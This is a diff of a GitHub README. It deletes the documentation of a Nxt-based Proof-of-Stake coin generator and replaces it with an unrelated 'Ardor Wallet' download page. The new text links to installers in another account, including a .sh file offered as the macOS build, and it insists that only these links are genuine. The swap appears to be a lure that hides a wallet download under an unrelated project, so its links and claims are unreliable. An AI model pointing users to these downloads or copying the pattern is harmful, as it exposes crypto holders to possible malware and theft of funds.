@@ -1,91 +1,77 @@
-# Proof-of-Stake-Cryptocurrency-generator ![GitHub](https://img.shields.io/github/license/mashape/apistatus.svg) [![Telegram](https://img.shields.io/badge/chat-Telegram-blue.svg)](https://t.me/coin_generator)
-Create your own Proof of Stake cryptocurrency with its own blockchain based on "Nxt Blockchain Creation Kit".
-It should satisfy the requirements of the Jelurida Public License version 1.1 for the Nxt Public Blockchain Platform.
-Basically 10% of your tokens should be given to the owners of the Nxt Cryptocurrency. Furthermore, the source needs to be disclosed and under the same license. Keep in mind that this generator is not perfect!
-* Website: https://coingenerator.sh
-* Read the story: https://medium.com/learning-lab/how-to-build-your-own-cryptocurrency-proof-of-stake-in-just-a-few-minutes-6d526bca4a91
+![Ardor Wallet](assets/banner-profile.png)
 
-This generator will assist you building your NXT clone.
-If you are an advanced user follow directly the official tutorial:
-* Nxt-clone-starter: https://bitbucket.org/Jelurida/nxt-clone-starter
-* Introduction to the NXT Blockchain Creation Kit: https://www.youtube.com/watch?v=6Wg3uv07GU4
+<h1 align="center">Ardor Wallet</h1>
 
-## What are the Cryptocurrency built with this generator?
+<p align="center">Ardor Wallet: one passphrase, ARDR and every child chain, on your own desktop</p>
 
-* Motive - https://motive.network
+<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/blob/HEAD/LICENSE"><img src="https://img.shields.io/badge/LICENSE-AGPL--3.0-1562a1?style=for-the-badge&labelColor=0c395d" alt="License: AGPL-3.0"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5"><img src="https://img.shields.io/badge/RELEASE-v2.6.5-1562a1?style=for-the-badge&labelColor=0c395d" alt="Release v2.6.5"></a></p>
 
-## Requirements
-* Java
-* NodeJS (>= version 8.0)
+---
 
-### How to install Java
-* General - Java 8
-* Ubuntu - http://www.webupd8.org/2012/09/install-oracle-java-8-in-ubuntu-via-ppa.html
-* Debian - http://www.webupd8.org/2014/03/how-to-install-oracle-java-8-in-debian.html
-* FreeBSD - pkg install openjdk8
+## Downloads - v2.6.5
 
-### How to install NodeJS
-* General - https://nodejs.org/en/download/
+<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>
 
-## Step 1 - Download the Nxt blockchain and create the genesis block
-1. Clone this repository with `git clone https://github.com/sandoche/Proof-of-Stake-Cryptocurrency-generator`, also feel free to fork this repository!
-2. Go to the cloned folder and install the npm dependencies with `npm install`
-3. Run the Nxt Blockchain with `npm run nxt`
-4. Then open http://localhost:7876/index.html in your favourite browser. Then create an account and save the private keys securely, wait until the full blockchain is synced, this can take a few hours. Copy your nxt address and also its public key.
-5. Open the file `docs/config/newGenesisAccounts.json`, this file will define the repartition of the coins your are creating. On the first block creation 1 billion of coins will be distributed, 10% of them will be distributed to the Nxt holders (this is part of the Jelurida Public License). You have to put the list of accounts you want to credit in the first block (the genesis block) and its matching public key. The total of the amounts should be 90000000000000000 if you don't know what to do, just put your NXT address your created (Step 1-4), and it's public key like this and save it. If you are not sure about what you are doing check this video: https://www.youtube.com/watch?v=6Wg3uv07GU4
-```
-{
-    "balances": {
-         "my nxt address here": 90000000000000000
-     },
-     "publicKeys": [
-         "the public key of this nxt address"
-     ]
- }
-```
-6. Go to http://localhost:7876/test?requestTag=ADDONS click on "downloadJPLSnapshot" then upload your file "newGenesisAccounts.json" and copy paste the height you can see in your wallet as in the screenshot below, then submit. A file will be generated after a few minutes, save it as "genesisAccounts.json" in the `templates/conf/data` folder.
-![screenshot](docs/assets/height.png)
-7. Create another account (like in Step 1.4), and save its public address in the file `templates/conf/data/genesisParameter.json`, also edit the epochBeginning with the current date.
+<div align="center">
 
-## Step 2 - Create your own Cryptocurrency
-1. Update the images from `templates/img` according to your blockchain images and the favicon in `templates`
-2. Then just run `npm run generate` and answer the generator's questions. The generator will automatically clone the nxt-clone-starter, change the port and name in the source code. For Windows user you should use `npm run generate:docker` and have docker installed.
-3. Once the cryptocurrency generated you can of course edit the interface inside the `<yourCrypto>/html` folder and find the java source in `<yourCrypto>/src/java`, note that you can find many parameters that you can edit in the following file `<yourCrypto>/src/java/nxt/Constants.java`
-4. Run it ! Go to `<yourCrypto>` folder compile with  `sh ./compile.sh` (or win-compile.sh for Windows) then run with `sh ./run.sh` (or run.bat for windows). Note that you can delete all the other folders they are now useless. Also you need to start forging yourself if you want to try to make transactions.
-5. Find the API doc in the `doc` folder
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
+| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
+| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |
 
-## Step 3 - Create the installer for the wallet (optionnal)
-* In order to build, please read the [build documentation](BUILD-README.md)
+</div>
 
-## Step 4 - Host your nodes in some servers
-Once your cryptocurrency ready for deployement, you need to host some nodes online. These nodes will share the transactions with other nodes, validates transactions, and forge blocks.
-You can do that in any virtual machine, you can use for example Amazon Web Services, or OVH. Once you have your virtual machine. Here is how to do:
-1. Connect to the machine, I recommend Ubuntu or Debian
-2. Clone your cryptocurrency
-3. Install java
-4. Open as an Inboud and Outbound TCP Port the "Peer port" that you chose when you run the generator, you can find it also in the `<yourCrypto>/src/java/nxt/peer/Peers.java` as `DEFAULT_PEER_PORT`
-5. Run `screen` and run the node with `sh ./run.sh` after  `sh ./compile.sh`
-6. You now need to run the forging mode of your node, in order to do that you can either do in command line following this do it also inside  `screen` to let it forge: `curl -d requestType=startForging -d secretPhrase="<passphrase>" http://localhost:<port>/nxt` don't forget of course to replace the <port> of the API port, and the <passphrase> with the passphrase of an account that has enough effective balance to forge.
-If the command line to launch forging does not work you can do it with the GUI after, installing a vnc server check the following links:
-* https://medium.com/@Arafat./graphical-user-interface-using-vnc-with-amazon-ec2-instances-549d9c0969c5
-* https://www.digitalocean.com/community/tutorials/how-to-set-up-vnc-server-on-debian-8
 
-## Troubleshooting
-### Mac & Linux
-* If step 1 doesn't work go to the `nxt` folder and run `sh ./compile.sh` then `sh ./run.sh`
-### Windows
-* If step 1 doesn't work go to the `nxt` folder and run `sh ./win-compile.sh` then open `run.bat`
-* For step 2 you need to use Docker, so first install docker and then run `npm run generate:docker` or `docker run -it --rm --name coin-generator -v "$PWD":/usr/src/app -w /usr/src/app node:8 npm run generate`
-### All OS
-* Sometime when running the wallet it's not logging in, open the wallet url in private navigation
+Each file's SHA-256 value sits beside it on [the release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
 
-## What is next?
-* You can find the source of the mobile app in the `mobile` folder
+> [!WARNING]
+> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
 
-## Buy me a beer
-If you like this project, feel free to donate:
-* Bitcoin: 19JiNZ1LkMaz57tewqJaTg2hQWH4RgW4Yp
-* Ethereum: 0xded81fa4624e05339924355fe3504ba9587d5419
-* Monero: 43jqzMquW2q989UKSrB2YbeffhmJhbYb2Yxu289bv7pLRh4xVgMKj5yTd52iL6x1dvCYs9ERg5biHYxMjGkpSTs6S2jMyJn
-* Motive: MOTIV-25T5-SD65-V7LJ-BBWRD (Get Motive Now: https://motive.network)
-* Paypal: https://www.paypal.me/kanbanote
+---
+
+## Why Ardor Wallet
+
+Ardor Wallet is the desktop client for the Ardor platform, and it keeps the keys where they belong: on the machine in front of you. One passphrase or seed opens the ARDR account and every child chain beside it, so Ignis, Nxt, Bitswift and Triffic all appear in the same window with their own balances and their own history.
+
+The application is a full participant in the network rather than a viewer. Forge a block or lease the weight to somebody else, trade on the built-in exchange, issue an asset and pay its holders, or timestamp a file and keep it retrievable. Installers exist for Windows, macOS and Linux, and the chain can live on your disk or be read from remote nodes.
+
+- Keys generated and stored on your own machine, with a hardware device for signatures.
+- Forging and leasing in the same window as the balance they draw on.
+- Coin exchange, asset exchange and marketplace without a second application.
+- Three installers, one passphrase, and no account registered anywhere.
+
+This repository is one of the utilities the Ardor Wallet account publishes beside the wallet application.
+
+---
+
+## Guides
+
+<div align="center">
+
+| Guide | What it answers |
+| --- | --- |
+| [What the Ardor wallet is, and which download is the real one](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md) | What the desktop client is, and which download is the genuine one. |
+| [Install the Ardor wallet on Windows, macOS or Linux](https://github.com/ardor-software/ardor-wallet-guides/blob/main/install-ardor-wallet-on-windows-macos-linux.md) | Install the Ardor wallet on each platform, pick the right asset and check the Java runtime. |
+| [Is the Ardor wallet safe? What to check and what to avoid](https://github.com/ardor-software/ardor-wallet-guides/blob/main/is-the-ardor-wallet-safe.md) | What makes the Ardor wallet safe in practice, and what undoes it. |
+| [Back up an Ardor wallet and move it to a new computer](https://github.com/ardor-software/ardor-wallet-guides/blob/main/back-up-and-move-your-ardor-wallet.md) | Move an Ardor wallet to a new computer without losing the only secret. |
+
+</div>
+
+Every guide this account publishes is listed in [the Ardor Wallet guide index](https://github.com/ardor-software/ardor-software/blob/main/index.md).
+
+---
+
+**Write the passphrase or seed on paper before the account holds anything, and never type it into a page that asks for it.**
+
+---
+
+## Support
+
+Open an issue on [the Ardor Wallet issue tracker](https://github.com/ardor-software/ardor-desktop-wallet/issues) and include the version you installed.
+
+## License
+
+AGPL-3.0
+
+[Download Ardor Wallet](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5) - [guide index](https://github.com/ardor-software/ardor-software/blob/main/index.md)
